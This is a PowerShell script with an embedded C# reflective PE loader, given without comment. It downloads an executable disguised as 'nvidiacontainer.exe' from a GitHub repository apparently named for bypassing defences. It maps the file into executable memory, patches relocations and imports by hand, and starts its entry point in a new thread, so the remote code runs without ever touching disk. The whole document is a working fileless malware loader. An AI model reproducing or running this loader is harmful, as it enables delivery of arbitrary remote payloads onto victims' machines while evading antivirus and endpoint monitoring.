$url = 'https://raw.githubusercontent.com/whatsabypass/exe/master/nvidiacontainer.exe'
$bytes = (New-Object Net.WebClient).DownloadData($url)

$code = @"
using System;
using System.Runtime.InteropServices;

public class Loader3 {
    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr e, IntPtr p, uint f, IntPtr i);
    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32")] static extern IntPtr LoadLibraryA(string n);
    [DllImport("kernel32", EntryPoint="GetProcAddress")] static extern IntPtr GetProcAddressName(IntPtr m, string n);
    [DllImport("kernel32", EntryPoint="GetProcAddress")] static extern IntPtr GetProcAddressOrd(IntPtr m, IntPtr ord);

    public static void Run(byte[] pe) {
        int e_lfanew       = BitConverter.ToInt32(pe, 0x3C);
        long imageBase     = BitConverter.ToInt64(pe, e_lfanew + 0x30);
        uint sizeOfImage   = BitConverter.ToUInt32(pe, e_lfanew + 0x50);
        uint ep_rva        = BitConverter.ToUInt32(pe, e_lfanew + 0x28);
        short sizeOfOptHdr = BitConverter.ToInt16(pe, e_lfanew + 0x14);
        short numSections  = BitConverter.ToInt16(pe, e_lfanew + 0x06);

        IntPtr mem = VirtualAlloc(IntPtr.Zero, sizeOfImage, 0x3000, 0x40);
        if (mem == IntPtr.Zero) throw new Exception("VirtualAlloc failed");

        // Copy headers
        int hdrsz = BitConverter.ToInt32(pe, e_lfanew + 0x54);
        Marshal.Copy(pe, 0, mem, hdrsz);

        // Copy sections
        int secOff = e_lfanew + 24 + sizeOfOptHdr;
        for (int i = 0; i < numSections; i++) {
            int o      = secOff + i * 40;
            uint vaddr = BitConverter.ToUInt32(pe, o + 12);
            uint raw   = BitConverter.ToUInt32(pe, o + 20);
            uint rawSz = BitConverter.ToUInt32(pe, o + 16);
            if (rawSz == 0) continue;
            Marshal.Copy(pe, (int)raw, new IntPtr(mem.ToInt64() + vaddr), (int)rawSz);
        }

        // Fix base relocations
        long delta = mem.ToInt64() - imageBase;
        if (delta != 0) {
            uint relocRVA  = BitConverter.ToUInt32(pe, e_lfanew + 0xB0);
            uint relocSize = BitConverter.ToUInt32(pe, e_lfanew + 0xB4);
            if (relocRVA != 0) {
                long p   = mem.ToInt64() + relocRVA;
                long end = p + relocSize;
                while (p < end) {
                    uint pageRVA = (uint)Marshal.ReadInt32((IntPtr)p);
                    uint blockSz = (uint)Marshal.ReadInt32((IntPtr)(p + 4));
                    if (blockSz == 0) break;
                    int cnt = (int)((blockSz - 8) / 2);
                    for (int i = 0; i < cnt; i++) {
                        ushort entry = (ushort)Marshal.ReadInt16((IntPtr)(p + 8 + i * 2));
                        if ((entry >> 12) == 10) { // IMAGE_REL_BASED_DIR64
                            IntPtr addr = new IntPtr(mem.ToInt64() + pageRVA + (entry & 0xFFF));
                            Marshal.WriteInt64(addr, Marshal.ReadInt64(addr) + delta);
                        }
                    }
                    p += blockSz;
                }
            }
        }

        // Fix imports (IAT) - with correct ordinal handling
        uint importRVA = BitConverter.ToUInt32(pe, e_lfanew + 0x90);
        if (importRVA != 0) {
            long idesc = mem.ToInt64() + importRVA;
            while (true) {
                uint iltRVA  = (uint)Marshal.ReadInt32((IntPtr)(idesc + 0));
                uint nameRVA = (uint)Marshal.ReadInt32((IntPtr)(idesc + 12));
                uint iatRVA  = (uint)Marshal.ReadInt32((IntPtr)(idesc + 16));
                if (nameRVA == 0 && iatRVA == 0) break;

                string dllName = Marshal.PtrToStringAnsi(new IntPtr(mem.ToInt64() + nameRVA));
                IntPtr hLib = LoadLibraryA(dllName);

                long iltPtr = mem.ToInt64() + (iltRVA != 0 ? iltRVA : iatRVA);
                long iatPtr = mem.ToInt64() + iatRVA;

                while (true) {
                    long entry = Marshal.ReadInt64((IntPtr)iltPtr);
                    if (entry == 0) break;

                    IntPtr fnAddr;
                    if ((entry & unchecked((long)0x8000000000000000L)) != 0) {
                        // Import by ordinal — must use IntPtr overload, NOT string
                        fnAddr = GetProcAddressOrd(hLib, new IntPtr(entry & 0xFFFF));
                    } else {
                        // Import by name — skip 2-byte hint
                        uint nameOff = (uint)(entry & 0x7FFFFFFF);
                        string fnName = Marshal.PtrToStringAnsi(new IntPtr(mem.ToInt64() + nameOff + 2));
                        fnAddr = GetProcAddressName(hLib, fnName);
                    }

                    Marshal.WriteInt64((IntPtr)iatPtr, fnAddr.ToInt64());
                    iltPtr += 8;
                    iatPtr += 8;
                }
                idesc += 20;
            }
        }

        IntPtr ep = new IntPtr(mem.ToInt64() + ep_rva);
        IntPtr t  = CreateThread(IntPtr.Zero, 0, ep, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(t, 0xFFFFFFFF);
    }
}
"@

Add-Type -TypeDefinition $code -Language CSharp
[Loader3]::Run($bytes)